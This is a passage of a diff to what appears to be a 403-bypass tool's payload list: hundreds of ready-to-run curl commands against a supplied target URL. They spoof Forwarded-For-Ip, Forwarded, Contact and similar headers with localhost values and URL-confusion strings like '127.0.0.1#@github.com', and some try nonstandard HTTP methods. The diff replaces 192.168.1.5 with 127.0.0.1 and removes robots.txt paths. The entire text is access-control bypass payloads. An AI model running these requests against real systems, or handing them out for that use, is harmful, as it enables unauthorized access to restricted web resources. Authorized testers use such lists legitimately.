 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8022,8 +8022,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: htt
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8045,22 +8045,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For-Ip: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8071,7 +8071,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8085,8 +8085,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8108,22 +8108,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded-For: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8134,7 +8134,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8148,8 +8148,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8171,10 +8171,10 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1 
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Forwarded: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Content-Length: 0' -H 'User-Agent: Forbidden/5.4' -X 'VERSION-CONTROL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Content-Length: 0' -H 'User-Agent: Forbidden/5.4' -X 'UPDATEREDIRECTREF' $1
@@ -8220,16 +8220,16 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Content-Length: 0' -H
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Content-Length: 0' -H 'User-Agent: Forbidden/5.4' -X 'ARBITRARY' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Content-Length: 0' -H 'User-Agent: Forbidden/5.4' -X 'ACL' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8240,7 +8240,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8254,8 +8254,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: http://127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -8277,22 +8277,22 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1 @h
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Contact: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'Connection: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
